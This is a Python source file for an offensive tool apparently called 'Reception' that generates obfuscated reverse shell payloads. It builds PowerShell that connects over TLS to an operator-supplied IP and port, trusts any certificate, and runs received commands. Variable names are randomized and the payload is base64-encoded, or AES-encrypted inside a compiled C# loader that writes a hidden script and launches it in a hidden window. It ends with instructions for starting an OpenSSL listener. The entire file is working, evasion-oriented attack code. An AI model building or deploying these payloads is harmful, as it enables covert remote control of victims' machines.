import os
import subprocess
import argparse
import random
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def print_banner():
    banner = """\033[91m
 ____                                   
|  _ \ _____   _____ _ __ ___  ___ _ __ 
| |_) / _ \ \ / / _ \ '__/ __|/ _ \ '__|
|  _ <  __/\ V /  __/ |  \__ \  __/ |   
|_| \_\___| \_/ \___|_|  |___/\___|_|   

@ShkudW
\033[0m"""
    print(banner)
    print("\033[96mGitHub: https://github.com/ShkudW/Reception\033[0m")

def generate_certificate(cert_file, key_file):
    try:
        subprocess.run([
            "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes",
            "-x509", "-subj", "/CN=www.reception.recep",
            "-keyout", key_file, "-out", cert_file
        ], check=True)
        print(f"\033[92mCertificate and key generated and saved to {cert_file} and {key_file}\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred during certificate creation: {e}")
        raise

def obfuscate_using_bank():
    bank = {
        "c1i3nt": random.choice(["$c1i3nt", "$CLiEn7", "$C1Li3n7"]),
        "str3am": random.choice(["$str3am", "$StrE4m", "$sTR3Am"]),
        "ss1Str3am": random.choice(["$ss1Str3am", "$SSlStr3Am", "$SsLStre4M"]),
        "r3ad3r": random.choice(["$r3ad3r", "$Re4d3R", "$rEAd3r"]),
        "wr1t3r": random.choice(["$wr1t3r", "$WrIT3r", "$wRiT3r"])
    }
    return bank

def encrypt_ps1(ps1_content, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_content = cipher.encrypt(pad(ps1_content.encode('utf-8'), AES.block_size))
    return base64.b64encode(encrypted_content).decode('utf-8')

def generate_encoded_obfuscated_ps1(ip, port):
    replacements = obfuscate_using_bank()

    ps1_content = f"""powershell.exe -WindowStyle Hidden -Command
$dummyVar = {random.randint(1000, 9999)} * {random.randint(1000, 9999)}
function CustomRead-Stream {{
    param($stream)
    return New-Object System.IO.StreamReader($stream)
}}
$encodedIP = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("{ip}"))
$decodedIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedIP))
{replacements['c1i3nt']} = New-Object System.Net.Sockets.TCPClient($decodedIP,{port});
{replacements['str3am']} = {replacements['c1i3nt']}.GetStream();
{replacements['ss1Str3am']} = New-Object System.Net.Security.SslStream({replacements['str3am']}, $false,
    {{
        param (
            $sender,
            [System.Security.Cryptography.X509Certificates.X509Certificate]$cert,
            [System.Security.Cryptography.X509Certificates.X509Chain]$chain,
            [System.Net.Security.SslPolicyErrors]$sslPolicyErrors
        )
        return $true;
    }}, $null);
{replacements['ss1Str3am']}.AuthenticateAsClient($decodedIP, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);
{replacements['r3ad3r']} = CustomRead-Stream({replacements['ss1Str3am']});
{replacements['wr1t3r']} = New-Object System.IO.StreamWriter({replacements['ss1Str3am']});
{replacements['wr1t3r']}.AutoFlush = $true;
{replacements['wr1t3r']}.WriteLine("Connection established successfully.");
while($true) {{
    $command = {replacements['r3ad3r']}.ReadLine();
    if ($command -eq "exit") {{ break; }}
    $currentDir = (Get-Location).Path + "> ";
    $output = $currentDir + (Invoke-Expression $command | Out-String);
    {replacements['wr1t3r']}.WriteLine($output);
    {replacements['wr1t3r']}.Flush();
}}
{replacements['ss1Str3am']}.Close();
{replacements['c1i3nt']}.Close();
    """

    encoded_command = base64.b64encode(ps1_content.encode('utf-8')).decode('utf-8')
    ps1_script = f"""
$encodedCommand = "{encoded_command}"
$decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
    """
    return ps1_script

def save_encoded_ps1(ip, port, output_file):
    ps1_script = generate_encoded_obfuscated_ps1(ip, port)
    with open(output_file, 'w') as file:
        file.write(ps1_script.strip())
    print(f"\033[92mBase64 encoded PowerShell script saved to {output_file}\033[0m")

def generate_exe_encrypted(ip, port, cert_file, output_file):
    replacements = obfuscate_using_bank()
    ps1_content = f""" 
{replacements['c1i3nt']} = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
{replacements['str3am']} = {replacements['c1i3nt']}.GetStream();
{replacements['ss1Str3am']} = New-Object System.Net.Security.SslStream({replacements['str3am']}, $false,
{{
    param (
        $sender,
        [System.Security.Cryptography.X509Certificates.X509Certificate]$cert,
        [System.Security.Cryptography.X509Certificates.X509Chain]$chain,
        [System.Net.Security.SslPolicyErrors]$sslPolicyErrors
    )
    return $true;
}}, $null);
{replacements['ss1Str3am']}.AuthenticateAsClient('{ip}', $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);
{replacements['r3ad3r']} = New-Object System.IO.StreamReader({replacements['ss1Str3am']});
{replacements['wr1t3r']} = New-Object System.IO.StreamWriter({replacements['ss1Str3am']});
{replacements['wr1t3r']}.AutoFlush = $true;
{replacements['wr1t3r']}.WriteLine("Connection established successfully.");
while ($true) {{
    $command = {replacements['r3ad3r']}.ReadLine();
    if ($command -eq 'exit') {{ break; }}
    $currentDir = (Get-Location).Path + '> ';
    $output = $currentDir + (Invoke-Expression $command | Out-String);
    {replacements['wr1t3r']}.WriteLine($output);
    {replacements['wr1t3r']}.Flush();
}}
{replacements['ss1Str3am']}.Close();
{replacements['c1i3nt']}.Close();
    """

    # Encryption parameters
    key = b'ThisIsA16ByteKey'  # 16 bytes key
    iv = b'ThisIsA16ByteIV '   # 16 bytes IV

    encrypted_content = encrypt_ps1(ps1_content, key, iv)

    cs_content = f"""
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Program
{{
    public static string DecryptString(string cipherText)
    {{
        byte[] key = Encoding.UTF8.GetBytes("ThisIsA16ByteKey");
        byte[] iv = Encoding.UTF8.GetBytes("ThisIsA16ByteIV ");
        byte[] buffer = Convert.FromBase64String(cipherText);

        using (Aes aes = Aes.Create())
        {{
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream(buffer))
            {{
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                {{
                    using (StreamReader reader = new StreamReader(cs))
                    {{
                        return reader.ReadToEnd();
                    }}
                }}
            }}
        }}
    }}

    public static void Main()
    {{
        string encryptedContent = "{encrypted_content}";
        string decryptedContent = DecryptString(encryptedContent);

        string filePath = Path.Combine(Directory.GetCurrentDirectory(), "reception.ps1");
        File.WriteAllText(filePath, decryptedContent);
        File.SetAttributes(filePath, FileAttributes.Hidden);

        // Execute the decrypted PowerShell script through a legitimate process
        Process proc3ss = new Process();
        proc3ss.StartInfo.FileName = "powershell.exe";
        proc3ss.StartInfo.Arguments = "-WindowStyle Hidden -File " + filePath;
        proc3ss.StartInfo.CreateNoWindow = true;
        proc3ss.StartInfo.UseShellExecute = false;
        proc3ss.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
        proc3ss.Start();
    }}
}}
    """

    cs_file = output_file.replace('.exe', '.cs')
    with open(cs_file, 'w') as file:
        file.write(cs_content.strip())

    print(f"\033[92mC# code saved to {cs_file}\033[0m")
    print("Compiling C# code to EXE...")

    subprocess.run(["mcs", cs_file, "-out:" + output_file])
    os.remove(cs_file)
    print(f"\033[92mExecutable saved to {output_file}\033[0m")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Generate a reverse shell with SSL encryption.")
    parser.add_argument("-ip", type=str, required=True, help="IP address for the reverse shell")
    parser.add_argument("-port", type=int, required=True, help="Port for the reverse shell")
    parser.add_argument("-type", type=str, choices=["ps1", "exe"], required=True, help="Type of payload to generate (ps1/exe)")
    parser.add_argument("-random", action="store_true", help="Randomize obfuscation")

    args = parser.parse_args()

    cert_file = "reception.pem"
    key_file = "reception.key"

    generate_certificate(cert_file, key_file)

    if args.type == "ps1":
        output_file = "reception.ps1"
        save_encoded_ps1(args.ip, args.port, output_file)
    elif args.type == "exe":
        output_file = "reception.exe"
        generate_exe_encrypted(args.ip, args.port, cert_file, output_file)

    print(f"\033[96mTo start an OpenSSL listener, run:\n\033[92mopenssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet\033[0m")
